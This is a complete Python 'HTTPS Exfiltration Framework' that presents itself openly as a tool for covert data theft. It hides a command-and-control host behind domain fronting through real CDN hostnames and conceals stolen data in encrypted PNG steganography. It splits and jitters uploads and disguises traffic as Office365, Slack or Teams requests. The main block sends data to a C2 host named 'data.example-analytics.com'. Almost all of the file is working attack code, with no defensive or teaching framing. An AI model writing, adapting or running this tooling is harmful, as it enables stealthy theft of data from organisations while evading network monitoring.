"""
HTTPS Exfiltration Framework
Covert data exfiltration via HTTPS with evasion techniques
"""

import base64
import hashlib
import json
import os
import random
import ssl
import struct
import time
import zlib
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode


class DomainFronting:
    """
    Domain fronting via CDN infrastructure
    Real destination hidden behind legitimate CDN domains
    """
    
    CDN_CONFIGS = {
        'cloudflare': {
            'fronts': ['cdnjs.cloudflare.com', 'ajax.cloudflare.com'],
            'sni_hosts': ['www.cloudflare.com'],
            'header_host': True
        },
        'akamai': {
            'fronts': ['a248.e.akamai.net', 'e673.dsce9.akamaiedge.net'],
            'sni_hosts': ['www.akamai.com'],
            'header_host': True
        },
        'azure': {
            'fronts': ['ajax.aspnetcdn.com', 'az416426.vo.msecnd.net'],
            'sni_hosts': ['www.microsoft.com'],
            'header_host': True
        },
        'amazon': {
            'fronts': ['d1.awsstatic.com', 'images-na.ssl-images-amazon.com'],
            'sni_hosts': ['aws.amazon.com'],
            'header_host': True
        },
        'google': {
            'fronts': ['www.google.com', 'ajax.googleapis.com'],
            'sni_hosts': ['www.google.com'],
            'header_host': True
        },
        'fastly': {
            'fronts': ['global.ssl.fastly.net'],
            'sni_hosts': ['www.fastly.com'],
            'header_host': True
        }
    }
    
    def __init__(self, cdn: str, real_host: str):
        self.config = self.CDN_CONFIGS.get(cdn, self.CDN_CONFIGS['cloudflare'])
        self.real_host = real_host
        self.front = random.choice(self.config['fronts'])
        
    def build_request(self, data: bytes, endpoint: str = '/api/telemetry') -> Dict:
        """Build domain-fronted HTTPS request"""
        return {
            'method': 'POST',
            'url': f'https://{self.front}{endpoint}',
            'headers': {
                'Host': self.real_host,
                'User-Agent': self._random_ua(),
                'Accept': 'application/json',
                'Content-Type': 'application/octet-stream',
                'X-Request-ID': hashlib.md5(os.urandom(16)).hexdigest()
            },
            'sni': random.choice(self.config['sni_hosts']),
            'data': data
        }
    
    def _random_ua(self) -> str:
        """Generate realistic User-Agent"""
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(uas)


class Steganography:
    """
    Image-based steganography for data hiding
    LSB encoding in PNG with encryption layer
    """
    
    def __init__(self, key: bytes):
        self.key = hashlib.sha256(key).digest()
        
    def encode_png(self, carrier: bytes, payload: bytes) -> bytes:
        """Encode payload into PNG using LSB steganography"""
        encrypted = self._encrypt(payload)
        
        signature = carrier[:8]
        chunks = self._parse_png_chunks(carrier[8:])
        
        for i, (chunk_type, chunk_data, crc) in enumerate(chunks):
            if chunk_type == b'IDAT':
                decompressed = zlib.decompress(chunk_data)
                encoded = self._lsb_encode(decompressed, encrypted)
                new_data = zlib.compress(encoded, 9)
                new_crc = zlib.crc32(chunk_type + new_data) & 0xffffffff
                chunks[i] = (chunk_type, new_data, new_crc)
                break
        
        return signature + self._rebuild_png_chunks(chunks)
    
    def decode_png(self, stego_image: bytes) -> bytes:
        """Extract hidden payload from stego PNG"""
        chunks = self._parse_png_chunks(stego_image[8:])
        
        for chunk_type, chunk_data, _ in chunks:
            if chunk_type == b'IDAT':
                decompressed = zlib.decompress(chunk_data)
                encrypted = self._lsb_decode(decompressed)
                return self._decrypt(encrypted)
        
        return b''
    
    def _lsb_encode(self, carrier: bytes, payload: bytes) -> bytes:
        """Encode payload into LSBs of carrier bytes"""
        payload = struct.pack('>I', len(payload)) + payload
        
        carrier = bytearray(carrier)
        payload_bits = ''.join(format(b, '08b') for b in payload)
        
        if len(payload_bits) > len(carrier):
            raise ValueError("Payload too large for carrier")
        
        for i, bit in enumerate(payload_bits):
            carrier[i] = (carrier[i] & 0xFE) | int(bit)
        
        return bytes(carrier)
    
    def _lsb_decode(self, stego: bytes) -> bytes:
        """Extract payload from LSBs"""
        length_bits = ''.join(str(b & 1) for b in stego[:32])
        length = int(length_bits, 2)
        
        total_bits = 32 + (length * 8)
        payload_bits = ''.join(str(b & 1) for b in stego[32:total_bits])
        
        payload = bytes(int(payload_bits[i:i+8], 2) for i in range(0, len(payload_bits), 8))
        return payload
    
    def _encrypt(self, data: bytes) -> bytes:
        """AES-256-GCM encryption"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            iv = os.urandom(12)
            cipher = Cipher(algorithms.AES(self.key), modes.GCM(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(data) + encryptor.finalize()
            return iv + encryptor.tag + ciphertext
        except ImportError:
            # Fallback XOR
            return self._xor_encrypt(data)
    
    def _decrypt(self, data: bytes) -> bytes:
        """AES-256-GCM decryption"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            iv, tag, ciphertext = data[:12], data[12:28], data[28:]
            cipher = Cipher(algorithms.AES(self.key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            return decryptor.update(ciphertext) + decryptor.finalize()
        except ImportError:
            return self._xor_encrypt(data)
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        return bytes(b ^ self.key[i % len(self.key)] for i, b in enumerate(data))
    
    def _parse_png_chunks(self, data: bytes) -> List[Tuple[bytes, bytes, int]]:
        chunks = []
        i = 0
        while i < len(data):
            length = struct.unpack('>I', data[i:i+4])[0]
            chunk_type = data[i+4:i+8]
            chunk_data = data[i+8:i+8+length]
            crc = struct.unpack('>I', data[i+8+length:i+12+length])[0]
            chunks.append((chunk_type, chunk_data, crc))
            i += 12 + length
            if chunk_type == b'IEND':
                break
        return chunks
    
    def _rebuild_png_chunks(self, chunks: List[Tuple[bytes, bytes, int]]) -> bytes:
        result = b''
        for chunk_type, chunk_data, crc in chunks:
            result += struct.pack('>I', len(chunk_data))
            result += chunk_type + chunk_data
            result += struct.pack('>I', crc)
        return result


class HTTPSExfiltrator:
    """Main HTTPS exfiltration controller"""
    
    def __init__(self, c2_host: str, cdn: str = 'cloudflare', stego_key: bytes = None):
        self.fronting = DomainFronting(cdn, c2_host)
        self.stego = Steganography(stego_key or os.urandom(32))
        self.chunk_size = 32 * 1024
        self.jitter_range = (1.0, 5.0)
        
    def exfiltrate(self, data: bytes, carrier_images: List[bytes] = None) -> List[Dict]:
        """Exfiltrate data via HTTPS"""
        compressed = zlib.compress(data, 9)
        chunks = [compressed[i:i+self.chunk_size] 
                  for i in range(0, len(compressed), self.chunk_size)]
        
        requests = []
        for i, chunk in enumerate(chunks):
            header = struct.pack('>HHI', i, len(chunks), len(chunk))
            payload = header + chunk
            
            if carrier_images:
                carrier = carrier_images[i % len(carrier_images)]
                payload = self.stego.encode_png(carrier, payload)
                content_type = 'image/png'
            else:
                payload = base64.b64encode(payload)
                content_type = 'application/json'
            
            req = self.fronting.build_request(payload)
            req['headers']['Content-Type'] = content_type
            req['chunk_index'] = i
            req['total_chunks'] = len(chunks)
            req['delay'] = random.uniform(*self.jitter_range)
            
            requests.append(req)
        
        return requests
    
    def execute(self, requests: List[Dict]) -> List[Dict]:
        """Execute exfiltration requests"""
        import urllib.request
        
        results = []
        for req in requests:
            time.sleep(req['delay'])
            ctx = ssl.create_default_context()
            
            http_req = urllib.request.Request(
                req['url'],
                data=req['data'],
                headers=req['headers'],
                method=req['method']
            )
            
            try:
                with urllib.request.urlopen(http_req, context=ctx, timeout=30) as resp:
                    results.append({
                        'chunk': req['chunk_index'],
                        'status': resp.status,
                        'success': True
                    })
            except Exception as e:
                results.append({
                    'chunk': req['chunk_index'],
                    'status': None,
                    'success': False,
                    'error': str(e)
                })
        
        return results


class TrafficMimicry:
    """Mimic legitimate application traffic patterns"""
    
    PROFILES = {
        'office365': {
            'endpoints': ['/owa/service.svc', '/autodiscover/autodiscover.xml'],
            'headers': {'X-MS-Exchange-Organization': 'true'},
            'timing': {'burst': 5, 'interval': 30}
        },
        'slack': {
            'endpoints': ['/api/rtm.connect', '/api/conversations.history'],
            'headers': {'X-Slack-Request-Timestamp': lambda: str(int(time.time()))},
            'timing': {'burst': 3, 'interval': 10}
        },
        'teams': {
            'endpoints': ['/api/csa/api/v1/teams/users', '/beta/me/chats'],
            'headers': {'X-ClientService-ClientTag': 'Teams-Desktop'},
            'timing': {'burst': 4, 'interval': 20}
        }
    }
    
    def __init__(self, profile: str = 'office365'):
        self.profile = self.PROFILES.get(profile, self.PROFILES['office365'])
        
    def shape_traffic(self, requests: List[Dict]) -> List[Dict]:
        """Apply traffic shaping based on profile"""
        shaped = []
        burst_count = 0
        
        for req in requests:
            req['url'] = req['url'].rsplit('/', 1)[0] + random.choice(self.profile['endpoints'])
            
            for key, value in self.profile['headers'].items():
                req['headers'][key] = value() if callable(value) else value
            
            burst_count += 1
            if burst_count >= self.profile['timing']['burst']:
                req['delay'] = self.profile['timing']['interval'] + random.uniform(0, 5)
                burst_count = 0
            else:
                req['delay'] = random.uniform(0.1, 1.0)
            
            shaped.append(req)
        
        return shaped


if __name__ == '__main__':
    exfil = HTTPSExfiltrator(
        c2_host='data.example-analytics.com',
        cdn='cloudflare',
        stego_key=b'operation_key_2024'
    )
    
    mimic = TrafficMimicry('office365')
    data = b"Test data for exfiltration"
    requests = exfil.exfiltrate(data)
    shaped = mimic.shape_traffic(requests)
    results = exfil.execute(shaped)
    print(f"Exfiltrated {len(results)} chunks")
